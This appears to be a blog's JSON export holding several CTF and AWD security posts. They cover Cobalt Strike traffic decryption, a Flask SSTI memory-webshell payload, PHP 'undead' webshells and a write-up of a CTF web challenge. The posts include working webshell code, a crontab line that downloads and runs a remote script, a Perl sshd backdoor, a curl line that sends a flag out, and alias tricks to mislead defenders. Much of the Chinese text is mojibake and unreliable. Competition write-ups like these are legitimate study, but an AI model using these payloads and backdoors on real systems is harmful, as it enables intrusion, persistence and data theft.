while(!@feof($io[2])) &#123; print(@fgets($io[2],2048)); &#125; @fclose($io[1]); @fclose($io[2]); @proc_close($p); &#125; elseif(fe(&#39;antsystem&#39;)) &#123; @antsystem($c); &#125; elseif(runshellshock($d, $c)) &#123; return $ret; &#125; elseif(substr($d,0,1)!&#x3D;&quot;&#x2F;&quot; &amp;&amp; @class_exists(&quot;COM&quot;)) &#123; $w&#x3D;new COM(&#39;WScript.shell&#39;); $e&#x3D;$w-&gt;exec($c); $so&#x3D;$e-&gt;StdOut(); $ret.&#x3D;$so-&gt;ReadAll(); $se&#x3D;$e-&gt;StdErr(); $ret.&#x3D;$se-&gt;ReadAll(); print($ret); &#125; else &#123; $ret &#x3D; 127; &#125; return $ret; &#125; ; $ret&#x3D;@runcmd($r.&quot; 2&gt;&amp;1&quot;); print ($ret!&#x3D;0)?&quot;ret&#x3D;&#123;$ret&#125;&quot;:&quot;&quot;; ;&#125;catch(Exception $e) &#123; echo &quot;ERROR:&#x2F;&#x2F;&quot;.$e-&gt;getMessage();&#125;;asoutput();die(); å¯ä»¥çœ‹åˆ°ï¼Œå‚æ•°sæ¥æ”¶æ‰§è¡Œå‘½ä»¤çš„å‚æ•° 1$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2)); æ‰€ä»¥s= /d \"D:\\\\phpstudy_pro\\\\WWW\\\\secret\"&\"C:\\Program Files\\7-Zip\\7z.exe\" x secret.zip -pP4Uk6qkh6Gvqwg3y&echo 378df2c234&cd&echo fb7f8f1 å¯ä»¥å¾—åˆ°å‹ç¼©å¯†ç ä¸ºP4Uk6qkh6Gvqwg3yã€‚ä¸‹é¢å°±å¯ä»¥è§£å‹beacon keys.ä¸‹é¢éœ€è¦åšçš„å·¥ä½œä¸ºï¼šè·å¾—ç§é’¥ï¼Œé€šè¿‡ç§é’¥è·å¾—AESå¯†é’¥ä»¥æŸ¥çœ‹ä¸teamserverçš„é€šä¿¡å†…å®¹ã€‚éœ€è¦ç”¨åˆ°çš„å·¥å…·åœ¨https://github.com/WBGlIl/CS_Decrypt é¦–å…ˆæ˜¯æ ¹æ®ç§é’¥æ–‡ä»¶æ¢å¤RSA KEYã€‚æ ¹æ®RSA KEY æ¢å¤AES KEYï¼Œéœ€è¦çœ‹beaconé€šä¿¡çš„æ•°æ®åŒ…ï¼Œæ ¹æ®csç‰¹æ€§ï¼Œä¸€èˆ¬è¿™ä¸ªå€¼è—åœ¨cookieé‡Œã€‚æ‹¿åˆ°AES KEYä¹‹åï¼Œç»§ç»­åˆ©ç”¨è„šæœ¬è¿˜åŸbeaconè¿”å›çš„å†…å®¹ï¼Œè¿™é‡ŒæŠ“å–çš„æ˜¯submit.phpçš„ç‰¹å¾ã€‚æ ¹æ®CobaltStrikeçš„é€šä¿¡è§„åˆ™ï¼Œbeaconä¼šå‘teamserver POST submit.php?id=xxxï¼ŒPOSTDATAä¸ºAESåŠ å¯†åçš„å†…å®¹ã€‚å°†åŠ å¯†åçš„å†…å®¹å¤åˆ¶å‡ºæ¥ä¹‹åè§£å¯†æ³¨æ„éœ€è¦æ˜¯base64æ ¼å¼çš„ï¼Œç„¶åä½¿ç”¨è„šæœ¬è¿›è¡Œè§£å¯†è§£å¯†åå¾—åˆ°flagã€‚ åè®°è¿™é¢˜å¤ªæŠ˜ç£¨äººäº†ï¼Œåšäº†å¥½ä¹…æ‰åšå‡ºæ¥ï¼Œå†™wpåˆå†™äº†ä¸€æ®µæ—¶é—´ã€‚é¡ºä¾¿å­¦äº†ä¸‹CSçš„ç®€å•é€šä¿¡è¿‡ç¨‹ï¼Œæ”¶è·è¿˜æ˜¯æœ‰çš„ã€‚å‚è€ƒé“¾æ¥ï¼šhttps://blog.csdn.net/qq_43264813/article/details/120560209https://wbglil.gitbook.io/cobalt-strike/cobalt-strike-yuan-li-jie-shao/cs-mu-biao-shang-xian-guo-cheng#beacon-shu-ju-hui-chuanhttps://www.wkr.moe/ctf/610.html#toc-head-3","categories":[],"tags":[],"author":"Polo"},{"title":"Analysis of flask memory webshell","slug":"Analysis-of-flask-memory-webshell","date":"2021-09-24T13:16:39.000Z","updated":"2021-09-24T14:56:49.000Z","comments":true,"path":"2021/09/24/Analysis-of-flask-memory-webshell/","link":"","permalink":"https://polosec.github.io/2021/09/24/Analysis-of-flask-memory-webshell/","excerpt":"","text":"NOTICEBefore analysis , I assumed that you know the princple of SSTI and now how to find the exploit chain.You should know url_for.__globals__ could find global variables in current app. IntroductionIn the previous passage Iâ€™ve introduced memory webshell in flask and implemented it,so in this passage Iâ€™ll analyse the procedure of a web request which request flask and make sense how to generate a memory shell. AnalysisThis is a EXP in Flask SSTI vulnerability which could register a route and execute system command. 123456789101112url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]( &quot;app.add_url_rule( &#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read() ) &quot;, &#123; &#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;], &#39;app&#39;:url_for.__globals__[&#39;current_app&#39;] &#125;) There are some complex functions and variables in the PoC,Iâ€™ll explain it.From SSTI we can reach eval function to execute python command,such as eval(â€œ__import__(â€˜osâ€™).popen(â€˜whoamiâ€™).read()â€)function add_url_rule() is used for adding route,such as add route in flask app. 1add_url_rule(rule, endpoint&#x3D;None, view_func&#x3D;None, provide_automatic_options&#x3D;None, **options) Briefly,we can pass parameter to this function to register route and define the handle function.Usually we can pass(â€˜/shellâ€™,â€™shellâ€™,lambda:xxxx_lambda_function_code) to this function to register a route /shell and define the handle founction.In this demo,the lambda function could receive parameter from front-end and execute system command.It looks like this: 123456app.add_url_rule( &#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read() ) This lambda function could receive and handle the parameter passed from front-end and execute it.Until now I didnâ€™t explain variables like request_ctx_stack ã€appã€current_app. request_ctx_stack like a stack structure, every web request will be pushed into this stack and pop ã€handle it.So, in this EXP it(request_ctx_stack.top) represents the current request object,just like in your flask appâ€™s every handle function in route to handle the current request! request.args.get() is used for get the parameterâ€™s value from front-end,juset need the parameter name and the default value is whoami in this EXP. In eval function, we noticed that there is a variable called app, but now we donâ€™t now what is app.But we know that we can pass parameters and values by eval via dict format in python, so we can pass paramater what we used like app,request_ctx_stack. We have analysed all the EXP, so we can generate a memory webshell now:)no new route was found in source code:) Reference https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/ https://segmentfault.com/blog/myflask https://www.cnblogs.com/bigox/p/11652859.html https://englndcib.blogspot.com/2021/08/python-lambda.html","categories":[],"tags":[],"author":"Polo"},{"title":"implementation of memory webshell in flask","slug":"webshell-in-flask","date":"2021-09-05T09:30:36.000Z","updated":"2021-09-15T15:08:03.426Z","comments":true,"path":"2021/09/05/webshell-in-flask/","link":"","permalink":"https://polosec.github.io/2021/09/05/webshell-in-flask/","excerpt":"","text":"IntroductionServer-side Template Injection(SSTI) is a common vulnerability in Flask framework.If the application choosed flask framework and exists SSTI vulnerability,actually easy to be exploited . It is easy to be exploited if a SSTI vulnerability were found. In this page ,Iâ€™ll show how to utilize it to inject webshell into memory.In next passage Iâ€™ll explain the procedure of a Flask app receive,understand and execute the command which sent by user. DemoA simple Flask framework web application with SSTI vulnerability as follows: 12345678910111213141516171819from flask import Flask,requestfrom flask import render_template_stringapp = Flask(__name__)@app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def test(): template = &#x27;&#x27;&#x27; &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; &#x27;&#x27;&#x27; %(request.args.get(&#x27;name&#x27;)) return render_template_string(template)if __name__ == &#x27;__main__&#x27;: app.run() In this demo , you can enter test directory and pass parameter â€˜nameâ€™ via GET method,which could execute python command by a specific attack payload which generated by SSTI exploit chains. Simple SSTI PoC in this demo(webserver launched on my desktop, default ip is 127.0.0.1, port:5000): 1http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;test?url&#x3D;&#123;&#123;url_for.__globals__.__builtins__[%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)&#125;&#125; This PoC shows that SSTI vulnerability could execute system command in web page which based on Flask.But the privilege inherited from the user who launched this application. Webshell injection in FlaskThere is a way to inject webshell into flask: 12345671.find the function which responsible for registering route2.pass paramaters to the function and improt os modules to execute system command3.expose an API to execute user-defined system commandso so here is the Payload&#123;&#123;url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;app.add_url_rule(&#39;&#x2F;shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&quot;,&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;)&#125;&#125; Above figure shows that a webshell was generated in memory and can be visited via route /shell while pass paramater cmd to execute the system command,default command are whoami. EndIn this passage I just show how to use it , but I think the critical problem is analyse the execute logic and try to find some way to fix? or exploit it in a new way:)","categories":[],"tags":[]},{"title":"AWDæ–°æ‰‹çš„ä¸æ­»é©¬åŠæƒé™ç»´æŒæ€è·¯","slug":"AWDä¸æ­»é©¬","date":"2021-05-29T02:42:40.000Z","updated":"2021-05-29T04:08:31.726Z","comments":true,"path":"2021/05/29/AWDä¸æ­»é©¬/","link":"","permalink":"https://polosec.github.io/2021/05/29/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC/","excerpt":"","text":"å‚è€ƒé“¾æ¥https://jlkl.github.io/2019/02/08/Web_13/https://rmb122.com/2019/04/04/%E5%B9%B2%E6%8E%89-PHP-%E4%B8%8D%E6%AD%BB%E9%A9%AC/https://www.cnblogs.com/Cl0ud/p/13620537.htmlhttps://zhuanlan.zhihu.com/p/88850561 æ¦‚å¿µä¸æ­»é©¬æŒ‡çš„æ˜¯å…¥åˆ°å†…å­˜çš„webshellï¼Œåœ¨PHPä¸­å¯ä»¥ä½¿ç”¨ulinkåˆ é™¤è‡ªèº«æ–‡ä»¶å¹¶å¾ªç¯åˆ›å»ºwebshellã€‚ ä¸æ­»é©¬åˆ©ç”¨æµç¨‹é¦–å…ˆæ ¹æ®webåé—¨æˆ–è€…ä»»ä½•æŒ–æ˜å‡ºæ¥çš„æ¼æ´å°è¯•æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚é—ç•™çš„webåé—¨ç­‰ï¼‰ï¼Œé€šè¿‡è¯¥ç±»æ¼æ´æˆåŠŸæ‰§è¡Œå†™å…¥ä¸æ­»é©¬çš„ç³»ç»Ÿå‘½ä»¤å¹¶æ‰§è¡Œè¯¥ä¸æ­»é©¬ã€‚æ¯”å¦‚é€šè¿‡å†…ç½®çš„åé—¨ç›´æ¥system(â€œecho ä¸æ­»é©¬è„šæœ¬å†…å®¹ &gt;/var/www/html;php ä¸æ­»é©¬æ–‡ä»¶å.phpâ€)ã€‚è¿™æ ·å°±ä¼šåœ¨è¯¥ç›®å½•ä¸‹ä¸æ–­ç”Ÿæˆä¸€ä¸ªä¸æ­»é©¬ æ¯”å¦‚.3.phpã€‚é€šè¿‡webshellç®¡ç†å·¥å…·æˆ–è€…ä½¿ç”¨Pythonå†™è„šæœ¬æ‰¹é‡è®¿é—®å»getflagã€‚ ä¸æ­»é©¬è¿™é‡Œå·ä¸ªåˆ«çš„å¸ˆå‚…çš„å›¾å…ˆä¸æ­»é©¬ä¸€èˆ¬é•¿è¿™æ · 12345678910111213&lt;?php ignore_user_abort(true);&#x2F;&#x2F;è®¾ç½®ä¸å®¢æˆ·æœºæ–­å¼€æ˜¯å¦ä¼šç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œè¿™é‡Œè®¾ç½®ä¸ºtrueåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€ï¼Œå³ä½¿ä¸å®¢æˆ·æœºæ–­å¼€è„šæœ¬ä»ä¼šæ‰§è¡Œã€‚ set_time_limit(0); unlink(__FILE__); $file &#x3D; &#39;.3.php&#39;; $code &#x3D; &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])&#x3D;&#x3D;&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;; &#x2F;&#x2F;pass&#x3D;pass while (1)&#123; file_put_contents($file,$code); system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#39;); usleep(0); &#125;?&gt; è¯¥ä¸æ­»é©¬ä¸æ–­ç”Ÿæˆ.3.phpï¼Œé€šè¿‡è®¿é—®http://localhost/.3.php?pass=pass ç„¶åPOST a=system(â€œæƒ³è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤â€);å³å¯é€šè¿‡ä¸æ­»é©¬å®ç°å‘½ä»¤æ‰§è¡Œã€‚è¿™é‡Œä½¿ç”¨MD5æ˜¯å› ä¸ºé˜²æ­¢åˆ«äººéª‘ç€è‡ªå·±çš„é©¬è¿›å»äº†ï¼ŒMD5ç†è®ºä¸Šä¸å¯é€†ã€‚å¦‚æœä½¿ç”¨pythonæ‰¹é‡getshellçš„è¯å¤§ä½“æ€è·¯å°±æ˜¯ url=http://localhost/.3.php?pass=passdata={â€œaâ€:â€system(&quot;cat /flag&quot;);â€}flag=requests.post(url=url,data=data).textç„¶åurlå˜å˜å°±å¯ä»¥ï¼Œä¸€èˆ¬ä¼šç»´æŠ¤ä¸€ä¸ªåœ°å€æ±  ä»åœ°å€æ± é‡Œé¢å–urlæˆ–è€…å–ç‰¹å¾ï¼ˆå¯èƒ½æŸä¸ªurlå­—æ®µä¸ä¸€æ ·ï¼‰ç›´æ¥æ‰“å°±è¡Œï¼Œå†é…åˆæäº¤flagçš„apiå°±å¯ä»¥å®ç°è‡ªåŠ¨getflagã€‚ ä¸æ­»é©¬åˆ é™¤è¿™é‡Œä¸æ­»é©¬åˆ é™¤æœ‰å‡ ä¸ªæ€è·¯1.shellè„šæœ¬ç›´æ¥åˆ é™¤ä¸æ­»é©¬ 12345while :do rm -rf .3.php; echo &quot;remove success&quot;;done è¿™é‡Œå…¶å®å¯ä»¥æ›´å®Œå–„ä¸€äº›ï¼Œæ¯”å¦‚æŒ‚ä¸Šwhileè‡ªåŠ¨æ£€æµ‹æ–°å¢çš„æ–‡ä»¶ æˆ–è€…é…åˆæ–‡ä»¶ç›‘æ§è„šæœ¬å®ç°æ–°å¢ä¹‹åç›´æ¥è°ƒç”¨å‡½æ•°åˆ é™¤æ–°å¢çš„æ–‡ä»¶ç­‰ç­‰ï¼ˆPythonå®ç°ï¼Œæˆ‘ä¸ä¼šshellï¼‰2.PHPæœåŠ¡é‡å¯ï¼ˆawdç¯å¢ƒå¯èƒ½ä¸å…è®¸ï¼Œå› ä¸ºæƒé™è¾ƒä½ï¼‰service apache2 restartservice php restart 3.æ€ä½æƒé™PHPè¿›ç¨‹php-apache: 12&lt;?phpsystem(&quot;kill &#96;ps -ef | grep httpd | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;); php-fpm: 123&lt;?phpsystem(&quot;kill &#96;ps -ef | grep php-fpm | grep -v grep | awk &#39;&#123;print $2&#125;&#39;&#96;&quot;); awdæƒé™ç»´æŒAWDçš„æƒé™ç»´æŒå…¶å®å’Œæ™®é€šçš„æƒé™ç»´æŒå·®ä¸å¤šå¸¸ç”¨çš„å¤§æ¦‚æœ‰ crontab sshè½¯è¿æ¥ sshwrapperã€‚è¯¦æƒ…å‚è€ƒhttps://xz.aliyun.com/t/7338ç»†çœ‹äº†ä¸‹è¿™ç¯‡æ–‡ç«  å‘ç°äº†ä¸€ä¸ªéšè—ä¸€å¥è¯çš„æ–¹æ³•ã€‚ 1echo -e &quot;&lt;?&#x3D;\\&#96;\\$_POST[cmd]\\&#96;?&gt;\\r&lt;?&#x3D;&#39;System default page.&#39;;?&gt;&quot; &gt;default.php crontabæ·»åŠ è®¡åˆ’ä»»åŠ¡è‡ªåŠ¨å†™ä¸æ­»é©¬ 1* * * * * curl http:&#x2F;&#x2F;host&#x2F;sh.sh &gt;&#x2F;tmp&#x2F;.tmp&#x2F;1.sh;chmod u+x &#x2F;tmp&#x2F;.tmp&#x2F;1.sh ; &#x2F;tmp&#x2F;.tmp&#x2F;1.sh æœ¬åœ°èµ·ä¸€ä¸ªhttpæœåŠ¡ æ”¾ä¸Šä¸€ä¸ªsh.shè„šæœ¬ï¼Œé‡Œé¢å†™äº†åˆ›å»ºphpä¸æ­»é©¬çš„å‘½ä»¤ã€‚ä¸‹é¢ä¸¤ç§æš‚æ—¶åˆ©ç”¨å¤±è´¥ å¯èƒ½æ˜¯è…¾è®¯äº‘çš„åŸå› ã€‚ 12345678910111213ssh wrappercd &#x2F;usr&#x2F;sbin&#x2F;mv sshd ..&#x2F;bin&#x2F;echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshdecho &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if(getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshdecho &#39;exec&#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshdchmod u+x sshd&#x2F;etc&#x2F;init.d&#x2F;sshd restartexp:socat STDIO TCP4:target_ip:22,sourceport&#x3D;13377sshè½¯è¿æ¥ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;5555;å»ºç«‹ä¸€ä¸ªè½¯è¿æ¥ï¼Œç„¶åé€šè¿‡5555ç«¯å£è®¿é—®sshæœåŠ¡ è¿˜æœ‰ä¸€ç§æ“ä½œå°±æ˜¯curlå¤–å¸¦æœ¬åœ°å‘½ä»¤æ‰§è¡Œç»“æœ,è¿™ä¸ªä¹Ÿå¯ä»¥å†™åˆ°crontabé‡Œé¢ï¼Œæ¯”è¾ƒæ–¹ä¾¿çš„ä½¿ç”¨æäº¤flagçš„apiæäº¤flagã€‚ç¤ºä¾‹å¦‚ä¸‹ curl â€œhttp://:7777?flag=$(cat /flag)â€ ä¸€äº›å°æŠ€å·§ç”¨æ¥è¿·æƒ‘å¯¹æ‰‹ 12alias crontab&#x3D;&quot;echo no crontab for &#96;whoami&#96; ||&quot;alias cat&#x3D;&quot;echo &#96;date&#96;|md5sum|cut -d &#39; &#39; -f1||&quot;","categories":[],"tags":[],"author":"Polo"},{"title":"å®‰ç½‘æ¯éƒ¨åˆ†wp","slug":"å®‰ç½‘æ¯éƒ¨åˆ†wp","date":"2021-05-12T09:57:42.000Z","updated":"2021-05-14T15:54:34.000Z","comments":true,"path":"2021/05/12/å®‰ç½‘æ¯éƒ¨åˆ†wp/","link":"","permalink":"https://polosec.github.io/2021/05/12/%E5%AE%89%E7%BD%91%E6%9D%AF%E9%83%A8%E5%88%86wp/","excerpt":"","text":"web1webshellä¸Šä¼  å‰ç«¯ç»•è¿‡ã€‚ç»•äº†åŠå¤©æ‰æƒ³èµ·æ¥æ˜¯å‰ç«¯ç»•è¿‡ã€‚ã€‚burpæ”¹ä¸ªåç¼€å°±å¥½äº† 12345678910111213141516171819ä»£ç function checkFile() &#123; var file &#x3D; document.getElementsByName(&#39;upload_file&#39;)[0].value; if (file &#x3D;&#x3D; null || file &#x3D;&#x3D; &quot;&quot;) &#123; alert(&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;); return false; &#125; &#x2F;&#x2F;å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ var allow_ext &#x3D; &quot;.jpg|.png|.gif&quot;; &#x2F;&#x2F;æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ var ext_name &#x3D; file.substring(file.lastIndexOf(&quot;.&quot;)); &#x2F;&#x2F;åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼  if (allow_ext.indexOf(ext_name + &quot;|&quot;) &#x3D;&#x3D; -1) &#123; var errMsg &#x3D; &quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot; + allow_ext + &quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot; + ext_name; alert(errMsg); return false; &#125;&#125; æ‹¿åˆ°shell èšå‰‘ä¸Šä¼  cat /flag web3http://172.20.2.4:9003/index.php?txt=../../../flag ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç§’äº† web7çŸ¥è¯†ç‚¹ï¼šSSTI,SSTIè¯»é…ç½®æ–‡ä»¶ï¼Œ/procç›®å½•çš„ä½œç”¨ï¼Œflask sessionä¼ªé€  é¦–å…ˆï¼Œå°è¯•ç™»å½•172.20.2.3:9006,ç™»å½•å¤±è´¥ï¼Œè®¿é—®äº†ä¸€ä¸‹robots.txt,å‘ç°äº†æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œè§‚å¯ŸURLï¼Œè€ƒè™‘å¯èƒ½å­˜åœ¨XSSï¼Œ image-20210511155722690.pngè¿™é‡Œçœ‹äº†ä¸€çœ¼ä¸­é—´ä»¶åˆ†æç»“æœï¼Œå‘ç°äº†flaskã€‚ã€‚flaskäººç‹‚å–œï¼ˆã€‚ ç›´æ¥4 image-20210511155809022.pngæ‡‚å¾—éƒ½æ‡‚ï¼Œé“sstiäº†ï¼Œå°è¯•ä¸€æ­¥æ­¥rceï¼Œæ£€æµ‹å‘ç°æ²¡å¼€debugæ¨¡å¼ï¼Œæ‰€ä»¥åªèƒ½èµ°å¸¸è§„çš„rceåˆ©ç”¨äº†ã€‚ å½“å°è¯•åˆ° 1&#39;&#39;.__class__.__mro__[-1].__subclasses__() æ—¶å‘ç°è¢«banäº†ï¼Œå•ç‹¬æµ‹è¯•äº†ä¸‹å°æ‹¬å·ï¼Œå‘ç°æ˜¯banäº†å°æ‹¬å·ã€‚æ—¢ç„¶banäº†å°æ‹¬å·ï¼Œé‚£ä¹ˆå¸¸è§„çš„ssti rceåŸºæœ¬å°±èµ°ä¸é€šäº†ã€‚åªèƒ½è€ƒè™‘è¯»å–ä¸€äº›æ•æ„Ÿæ–‡ä»¶ï¼Œæ¯”å¦‚configï¼Œä½¿ç”¨payload è¯»å–configæ–‡ä»¶ï¼Œå‘ç°äº† secret_key image-20210511160014837.png secret_keyçš„ä½œç”¨æ˜¯ç”Ÿæˆsessionï¼Œå…·ä½“æ­¥éª¤æˆ‘å¿˜äº†ï¼Œåæ­£æ˜¯æ ¹æ®secret_keyå¯ä»¥è¿˜åŸå’Œç”Ÿæˆå¯¹åº”çš„sessionã€‚ githubæœ‰å¯¹åº”çš„å·¥å…·ï¼Œflask session managerã€‚ æ¥ä¸‹æ¥çœ‹äº†çœ‹æºç ï¼Œimage-20210511160246157.png ä¸€ä¸ªç®€å•çš„å‰ç«¯éªŒè¯ï¼ŒburpæŠ“è¿”å›åŒ…æŠŠ0æ”¹æˆ1å°±è¡Œï¼Œè¿™æ ·å°±é¡ºåˆ©è¿›å…¥åå°äº†ã€‚ä½†æ˜¯è¿›å…¥åå°åæç¤ºæˆ‘ä¸æ˜¯adminï¼ˆ2333 image-20210511160330889.png å¥½å§ï¼Œçœ‹èµ·æ¥æ˜¯è¦ä¼ªé€ adminçš„sessionäº†ã€‚ç°åœ¨secret_keyæœ‰äº†ï¼Œç”¨å·¥å…·å…ˆè§£å¯†å½“å‰sessionï¼ŒæŠŠç”¨æˆ·åæ”¹æˆadminåå†ç”Ÿæˆsessionã€‚å¦‚ä¸‹å›¾æ‰€ç¤º image-20210511160731351.png é‚£ä¹ˆå½“å‰ç”Ÿæˆçš„adminçš„sessionå°±æ˜¯eyJ1c2VybmFtZSI6ImFkbWluIn0.YJo7Og.7WfYqubO5M7KZ-8IXXKIp6kMf5oï¼Œedit this cookie æ¢ä¸€ä¸‹ï¼ˆæˆ‘è¿™chromeæœ‰bugï¼Œç”¨çš„firefoxï¼‰ image-20210511160841881.png å·²ç»ç»™äº†hintï¼Œè€ƒè™‘ä»»æ„æ–‡ä»¶è¯»å–ï¼Œé¦–å…ˆå°è¯•è¯»å–/etc/passwdï¼ŒæˆåŠŸã€‚ image-20210511161046827.png æ¥ä¸‹æ¥å°è¯•è¯»flagã€‚ç›´æ¥/flagä¸è¡Œï¼Œå…³é”®å­—ç»™è¿‡æ»¤äº†ã€‚å¡äº†å¥½å‡ ä¸ªå°æ—¶ ç”¨äº†æŒºå¤šç»•è¿‡æ–¹æ³• /fla? /f* ç­‰ç­‰ ä½†æ˜¯å¯èƒ½ä¸­é—´æœ‰è½¬ä¹‰ä¹‹ç±»çš„ï¼Œæœ€ç»ˆä¼ åˆ°Linuxå±‚å¹¶ä¸èƒ½è¯†åˆ«é€šé…ç¬¦ï¼Œæ‰€ä»¥å¡äº†å¾ˆé•¿æ—¶é—´ æœ€åçš„æ€è·¯æ˜¯ä¹‹å‰æ¯”èµ›ä¸­è¯»flagï¼Œè¿‡æ»¤äº†å¾ˆå¤šï¼Œå¸ˆå‚…å‘Šè¯‰æˆ‘åˆ©ç”¨/proc/ç›®å½•è¯»æ–‡ä»¶ï¼Œprocç›®å½•ä»£è¡¨äº†ä¸å½“å‰è¿è¡Œè¿›ç¨‹æœ‰å…³çš„ä¿¡æ¯å¹¶ä»¥æ–‡ä»¶çš„å½¢å¼å±•ç¤ºï¼ˆå­¦ä¹ é“¾æ¥ï¼šhttps://blog.csdn.net/qq_45521281/article/details/114594402ï¼‰ï¼Œè€Œ/proc/selfç›®å½•ä»£è¡¨äº†å½“å‰è¿›ç¨‹çš„æœ‰å…³ä¿¡æ¯å¹¶ä»¥æ–‡ä»¶çš„å½¢å¼å±•ç¤ºï¼Œéœ€è¦æ³¨æ„çš„æœ‰fdã€cmdlineã€cwdã€envrionç­‰ã€‚ /proc/self/cmdline ä»£è¡¨å½“å‰çš„å‘½ä»¤è¡Œè¾“å…¥å†…å®¹ï¼Œæˆ‘è¯»å–äº†ä¹‹åæ˜¯è¿™ä¸ª image-20210511161330178.png å¥½å®¶ä¼™ ç»å¯¹è·¯å¾„æœ‰äº†ï¼Œç›´æ¥è¯»æ–‡ä»¶ /app/app_a384gh1.py ç¨‹åºä»£ç å¦‚ä¸‹ï¼ŒåŸºæœ¬ä¿®å¤äº†ssti-&gt;rceï¼Œç„¶åçœ‹åˆ°äº†import ffffffff111llllag æ–‡ä»¶ï¼Œé‚£ç›´æ¥è¯»å½“å‰/appç›®å½•ä¸‹çš„ffffffff111llllag.pyå°±å¥½äº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from flask import Flask,request,render_template_string,redirect,render_template,sessionimport randomimport stringimport base64import ffffffff111llllagapp = Flask(import_name=__name__,template_folder=&#x27;templates&#x27;,static_folder=&#x27;static&#x27;,static_url_path=&#x27;/static&#x27;)app.config[&#x27;SECRET_KEY&#x27;] =&#x27;&#x27;.join(random.sample(string.ascii_letters + string.digits, 8))@app.before_requestdef before_request(): if &#x27;/admin/&#x27; in request.path: sess_name=&#x27;guest&#x27; print(session) if &#x27;username&#x27; in session: sess_name=session[&#x27;username&#x27;] if sess_name!=&#x27;admin&#x27;: return &#x27;Your current account is &#x27;+sess_name+&#x27; not admin&#x27;@app.after_requestdef makeheader(response): response.headers[&quot;X-Powered-By&quot;] = &quot;PHP/7.2.10&quot; response.headers[&quot;Hint&quot;] = &quot;Wake up Neo, the Matrix has you&quot; response.headers[&#x27;Server&#x27;]=&#x27;Apache/2.4.35 (Win64) PHP/7.2.10&#x27; return response@app.route(&#x27;/&#x27;)def redirect_2_index(): if &#x27;username&#x27; not in session: print(&#x27;not in session!&#x27;) session[&#x27;username&#x27;]=&#x27;guest&#x27; return redirect(&quot;./index.php&quot;, code=302)@app.route(&quot;/err.php&quot;)def err(): #I patched the SSTI vulnerability.How clever I am! errorinfo=request.args.get(&quot;errorinfo&quot;) blacklist=[&quot;(&quot;,&quot;)&quot;] for black in blacklist: if black in errorinfo: return &quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot; return render_template_string(&quot;Oh no,there is an Error! Error info:&lt;p&gt; %s&quot; % errorinfo)@app.route(&quot;/index.php&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/login.php&quot;,methods=[&#x27;POST&#x27;])def login(): username=request.form[&#x27;username&#x27;] password=request.form[&#x27;password&#x27;] if &quot;&#x27;&quot; in username or &quot;&#x27;&quot; in password: return &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;&#x27;&quot; return &#x27;0&#x27;@app.route(&quot;/admin/backendmanage.php&quot;)def backendmanage(): img=request.args.get(&quot;img&quot;) if not img: img=&#x27;1.png&#x27; if &quot;flag&quot; in img: return &quot;You&#x27;re just a dirty hacker,aren&#x27;t you?&quot; content = &#x27;&#x27; with open(img, &#x27;rb&#x27;) as img_f: content = img_f.read() content = base64.b64encode(content) content=&#x27;&#x27;.join([chr(i) for i in content]) return &#x27;&lt;h1&gt;Current 